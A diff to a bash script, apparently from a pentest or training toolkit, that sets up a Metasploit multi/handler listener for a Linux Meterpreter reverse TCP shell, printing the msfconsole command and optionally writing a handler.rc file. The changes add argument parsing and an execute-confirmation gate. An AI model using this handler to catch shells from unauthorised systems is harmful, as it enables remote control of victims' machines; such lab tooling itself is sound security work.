@@ -17,13 +17,15 @@ show_help() {
     echo "  $(basename "$0") --help             # Show this help message"
 }
 
-[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0
+parse_common_args "$@"
+set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"
 
 require_cmd msfconsole "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"
 
 LHOST="${1:-$(ipconfig getifaddr en0 2>/dev/null || echo '10.0.0.1')}"
 LPORT="${2:-4444}"
 
+confirm_execute
 safety_banner
 
 info "=== Metasploit Multi/Handler Setup ==="
@@ -95,16 +97,17 @@ echo "    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/me
 echo ""
 
 # Interactive demo (skip if non-interactive)
-[[ ! -t 0 ]] && exit 0
+if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
+    [[ ! -t 0 ]] && exit 0
 
-echo ""
-info "To catch a Linux Meterpreter reverse shell, run:"
-echo ""
-echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
-echo ""
-read -rp "Create a handler.rc resource script file instead? [y/N] " answer
-if [[ "$answer" =~ ^[Yy]$ ]]; then
-    cat > handler.rc <<RCEOF
+    echo ""
+    info "To catch a Linux Meterpreter reverse shell, run:"
+    echo ""
+    echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
+    echo ""
+    read -rp "Create a handler.rc resource script file instead? [y/N] " answer
+    if [[ "$answer" =~ ^[Yy]$ ]]; then
+        cat > handler.rc <<RCEOF
 use exploit/multi/handler
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST ${LHOST}
@@ -112,6 +115,7 @@ set LPORT ${LPORT}
 set ExitOnSession false
 exploit -j
 RCEOF
-    success "Created handler.rc"
-    info "Run it with: msfconsole -r handler.rc"
+        success "Created handler.rc"
+        info "Run it with: msfconsole -r handler.rc"
+    fi
 fi
